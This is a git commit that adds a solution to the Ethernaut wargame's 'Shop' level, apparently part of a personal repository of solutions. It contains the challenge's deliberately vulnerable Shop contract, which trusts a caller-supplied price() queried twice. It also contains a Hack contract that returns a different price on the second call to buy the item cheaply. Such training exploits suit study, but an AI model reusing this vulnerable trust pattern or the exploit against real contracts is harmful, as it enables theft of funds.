5ae6b236c0dbfbffb9af8d2ca25be5db2f400930
tjl352 <tjl352@gmail.com>
2025-07-02 11:41:00 -0400

    Ethernaut 21 Complete

---
+++ contracts/21/Ethernaut21.sol
@@ -0,0 +1,42 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface Buyer {
+    function price() external view returns (uint256);
+}
+
+contract Shop {
+    uint256 public price = 100;
+    bool public isSold;
+
+    function buy() public {
+        Buyer _buyer = Buyer(msg.sender);
+
+        if (_buyer.price() >= price && !isSold) {
+            isSold = true;
+            price = _buyer.price();
+        }
+    }
+}
+
+contract Hack {
+    Shop private immutable target;
+
+    constructor(address _target) {
+        target = Shop(_target);
+    }
+
+    function pwn() external {
+        target.buy();
+        require(target.price() == 99, "price != 99");
+    }
+
+    function price() external view returns (uint256) {
+        if (target.isSold()){
+            // 2nd call
+            return 99;
+        }
+        //1st call
+        return 100;
+    }
+}
